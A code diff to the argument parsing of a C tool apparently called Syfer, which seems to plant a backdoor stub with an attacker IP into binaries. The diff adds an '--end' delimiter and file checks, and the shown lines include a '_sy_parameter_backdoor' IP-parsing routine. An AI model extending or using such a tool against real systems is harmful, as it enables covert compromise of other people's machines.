@@ -49,9 +49,12 @@ syfer_verbose( t__sy_binary *data ) {
 static void
 bypass_parameters( int ac, char **av, int *i )
 {
-	while ( ++(*i) < ac && av[(*i)][0] == '-' )
-		;
-	--(*i);
+	while ( *i < ac ) {
+		if ( ! strcmp( av[ *i ], "--end") )
+			break;
+		else
+			++(*i);
+	}
 }
 
 static uint32_t
@@ -71,8 +74,6 @@ get_numbers_of_parameters( int ac, char **av, int i, const char *model ) {
 static int
 _sy_parameter_backdoor( int ac, char **av, int *i, t__sy_binary *data )
 {
-	uint8_t	num = 0x00;
-
     regex_t regex;
 	if ( regcomp(&regex,
 			"^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))."
@@ -197,31 +198,38 @@ analyze_parameter( int __attribute__((unused)) ac, char __attribute__((unused))*
 	t__sy_binary	*data = calloc( sizeof( char), sizeof( t__sy_binary));
 	if ( data == NULL )
 		return fprintf( stderr, "%s[-] Memory allocation of the structure \"__sy_binary\" failed %s\n", ANSI_COLOR_RED, ANSI_COLOR_RESET );
-	fprintf( stderr, "%s [+] Successful memory allocation of the \"__sy_binary\" structure %s\n", ANSI_COLOR_GREEN, ANSI_COLOR_RESET );
+	fprintf( stderr, "%s[+] Successful memory allocation of the \"__sy_binary\" structure %s\n", ANSI_COLOR_GREEN, ANSI_COLOR_RESET );
 
-    for ( int i = 0x01; i <= ac; i++ ) {
+    for ( int i = 0x01; i < ac; i++ ) {
 		__sy_stat	info = {0};
-		if ( lstat( av[i], &info ) == -1 )
+		if ( lstat( av[i], &info ) == -1 ) {
+			fprintf( stderr, "%s[-] The %s file does not exist.%s\n", ANSI_COLOR_RED, av[ i ], ANSI_COLOR_RESET);
+			i = ( i + 1 );
 			bypass_parameters( ac, av, &i );
+			continue;
+		}
+		else if ( ! S_ISREG( info.st_mode )) {
+			fprintf( stderr, "%s[-] The %s file is not an ordinary file.%s\n", ANSI_COLOR_RED, av[ i ], ANSI_COLOR_RESET);
+			i = ( i + 1 );
+			bypass_parameters( ac, av, &i );
+			continue;
+		}
 		else
-        {
-            data->binary_name = av[i++];
-
-		    do_analyze_parameter(ac, av, &i, data);
-
-            if ( *data->out_binary_name == 0x00 ) {
-                char *tmp = strrchr( data->binary_name, '/');
-                tmp = ( tmp == NULL ) ? data->binary_name : tmp+1;
-                sprintf( data->out_binary_name, "Syfer_%s.out", tmp);
-            }
-            syfer_verbose( data );
-            syfer( data );
-
-            ( data->stub != NULL ) ? free( data->stub ) : 0X00;
-            ( data->ip != NULL ) ? free( data->ip ) : 0X00;
-            memset( data, 0X00, sizeof( t__sy_binary));
-        }
-	}
+		{
+			data->binary_name = av[i++];
+			do_analyze_parameter(ac, av, &i, data);
+			if ( *data->out_binary_name == 0x00 ) {
+				char *tmp = strrchr( data->binary_name, '/');
+				tmp = ( tmp == NULL ) ? data->binary_name : tmp+1;
+				sprintf( data->out_binary_name, "Syfer_%s.out", tmp);
+			}
+			syfer_verbose( data );
+			syfer( data );
+			( data->stub != NULL ) ? free( data->stub ) : 0X00;
+			( data->ip != NULL ) ? free( data->ip ) : 0X00;
+			memset( data, 0X00, sizeof( t__sy_binary));
+		}
+    }
     free( data );
-	return ( 0x00 );
+    return ( 0x00 );
 }
